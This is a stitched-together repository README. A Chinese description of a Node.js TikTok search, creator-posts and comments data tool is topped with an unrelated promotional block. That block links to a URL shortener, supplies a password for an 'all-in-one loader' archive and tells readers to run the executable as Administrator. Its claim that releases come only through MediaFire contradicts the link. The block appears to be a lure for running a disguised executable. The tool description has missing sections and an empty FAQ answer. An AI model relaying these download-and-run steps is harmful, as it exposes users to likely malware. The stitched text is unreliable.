<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# 🚀 TikTok 数据技能 · 关键词搜索 / 达人作品 / 视频评论

> ### 一句话价值
>
> **给 AI 一个能真正"上 TikTok 查数据"的手。** 一句话就能拿到 TikTok 公开的搜索结果、博主作品和视频评论，输出可直接分析的结构化 JSON——不用登录账号、不用养号、不用怕封号、不用自己写爬虫。

## 1. 你为什么需要它（先看这段）

做 TikTok 内容，最贵的东西不是创意，是**判断依据**。

| 你现在的做法                      | 代价                                | 用本技能之后                          |
| --------------------------------- | ----------------------------------- | ------------------------------------- |
| 手动刷 TikTok 找对标爆款          | 2 小时起步，还容易漏                | 一句话拿到 Top N 高赞视频与互动数据   |
| 用网页爬虫抓                      | 反爬、风控、封 IP，脚本三天两头失效 | 走正规 API，无需登录，无封号风险      |
| 买 SaaS 数据平台                  | 年费几千到几万，还只能看固定看板    | 数据在 AI 里，想怎么分析就怎么分析    |
| 让 AI 凭记忆给你"TikTok 爆款规律" | 模型没有实时数据，输出的全是想象    | AI 拿到**真实、实时的公开数据**再分析 |

**核心差别**：这不是又一个数据看板，是把 TikTok 数据**接进你的 AI 工作流**——拿到数据后，AI 可以直接帮你做选题归纳、竞品对比、评论聚类、红人清单、周报表格，一条链路走完。

---

## 2. 三大能力

| 能力              | 一句话                                             | 典型产出                           |
| ----------------- | -------------------------------------------------- | ---------------------------------- |
| 🔍 **关键词搜索** | 按关键词搜 TikTok 内容，支持相关度/最多点赞排序与时间窗筛选 | 爆款清单、标题与标签规律、时长分布 |
| 🦸 **博主作品**   | 按主页链接或用户名批量拉取博主公开作品，支持最新/最热排序   | 竞品内容策略、更新节奏、爆款占比   |
| 💬 **视频评论**   | 按视频链接或作品 ID 拉取评论与互动数据             | 舆情正负向、高赞观点、用户真实诉求 |

---

## 3. 谁在用 / 能赚回什么

- **TikTok 创作者 / MCN**：每天省 1–2 小时找选题，爆款命中率靠数据而不是靠猜
- **跨境卖家 / DTC 品牌**：批量筛红人、看竞品内容打法、盯品类动向
- **增长 / 投放团队**：投放前先看这个赛道谁在跑、什么内容跑得动
- **市场研究 / 咨询**：把 TikTok 公开数据变成可交付的表格与报告
- **AI Agent 开发者**：一个可直接编排的只读数据节点，stdout 纯 JSON，零解析成本

> 保守估算：按每周节省 5 小时人工刷数据、时薪 100 元计，**一个月回本 2000 元以上**——而这个技能的定价远低于此。

---

# 🔍 关键词搜索（最简单）
node scripts/tiktok/search-cli.js --keyword "AI"

# 🔥 找点赞最多的爆款（最常用）
node scripts/tiktok/search-cli.js --keyword "AI" --sort 1 --limit 20

## 5. 为什么选它（对比表）

| 维度       | 本技能                           | 自建爬虫                | SaaS 数据平台         | 让 AI 硬编            |
| ---------- | -------------------------------- | ----------------------- | --------------------- | --------------------- |
| 账号安全   | ✅ 不登录、不写操作、零封号风险  | ❌ 风控封 IP / 封号     | ✅ 无风险             | ❌ 数据本身就是幻觉   |
| 数据真实性 | ✅ 实时真实公开数据              | ⚠️ 结构一变就失效       | ✅ 真实               | ❌ 模型记忆，无实时性 |
| 上手成本   | ✅ 配一个环境变量，30 秒         | ❌ 需研发 + 长期维护    | ⚠️ 学平台、看固定看板 | ✅ 零成本             |
| 分析自由度 | ✅ 数据在 AI 里，任意二次分析    | ✅ 自由                 | ❌ 只能用它的看板     | —                     |
| 费用       | ✅ 一次性 / 低门槛               | ❌ 隐性研发与维护成本高 | ❌ 年费几千至数万     | ✅ 免费（但没用）     |
| 依赖与体积 | ✅ 零 npm 依赖，纯 Node 内置模块 | ❌ 一堆依赖             | —                     | —                     |
| 可编排     | ✅ stdout 纯 JSON + 明确退出码   | ⚠️ 需自己封装           | ❌ 多为封闭系统       | —                     |

---

## 6. 技术规格

- **运行环境**：Node.js ≥ 16.14.0，Windows / macOS / Linux 全平台
- **依赖**：**零第三方 npm 依赖**，仅用 Node 内置模块（`https` / `fs` / `path` / `os` / `querystring`）
- **输出**：stdout 纯 JSON（统一信封：`status` / `error_code` / `request` / `metadata` / `results` / `warnings`），日志与进度走 stderr
- **退出码**：`0` 成功（含空结果）/ `1` 运行错误 / `3` Token 异常
- **参数回退可见**：任何非法参数被自动修正时，都会写入 `warnings` 数组，不会被静默吞掉
- **稳定性**：内置指数退避重试（创建 3 次、查询 20 次），超时 20 秒，Token 类错误不重试
- **日志留存**：每次运行自动落盘为 JSON，便于留档与复盘
- **字段规范**：`assets/` 下提供 6 份 JSON Schema（draft-07），入参出参全部可校验

---

## 8. 常见问题

<details>
<summary><b>Q：运行报错，提示无权限 / 退出码 3？</b></summary>

A：环境变量未配置或 Token 格式不对（需 16–256 位，仅字母、数字、下划线、连字符）。

```bash
# Windows
set GUAIKEI_API_TOKEN=你的TOKEN
# macOS / Linux
export GUAIKEI_API_TOKEN=你的TOKEN
```

Token 是私有凭证，请勿分享给他人。

</details>

<details>
<summary><b>Q：搜索结果为空？</b></summary>

A：`empty` 是**正常结果**，表示"确实没搜到"。建议：换更通用的关键词；把 `--time` 改为 `0` 放开时间窗。

</details>

<details>
<summary><b>Q：返回的条数少于我设的 limit？</b></summary>

A：该条件下服务端没有更多数据，或触发了单次上限。建议把 `--limit` 降到 ≤ 1000 并分批获取。

</details>

<details>
<summary><b>Q：我传的参数好像没生效？</b></summary>

A：查看输出 JSON 里的 `warnings` 数组——参数不合法时会被自动回退为默认值，并在这里写明"哪个参数被改成了什么"。

</details>

<details>
<summary><b>Q：日志文件在哪？</b></summary>

A：运行结束后 stderr 会打印"已保存到 …"，路径为系统临时目录下的 `tiktok-guaikei/logs/<日期>/`，命名格式 `<时间戳>_<标识>_<命令>.json`。

</details>

<details>
<summary><b>Q：会不会泄露我的 Token？</b></summary>

## 9. 计费与支持

- **计费**：按 API 调用量计费，官方渠道开通，用量透明可查；**失败调用不计费**。
## 10. 合规声明

- 仅获取 TikTok **公开可见**数据；不登录账号，不执行发布 / 点赞 / 评论 / 关注 / 私信等任何写操作。
- 不采集手机号、精确位置、私信等隐私字段。
- 数据仅限个人 / 团队内部分析使用；对外发布或商用前请自行确认授权，并对用户昵称等个人信息做脱敏处理。


---

MIT License

Copyright (c) 2026 why20261

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
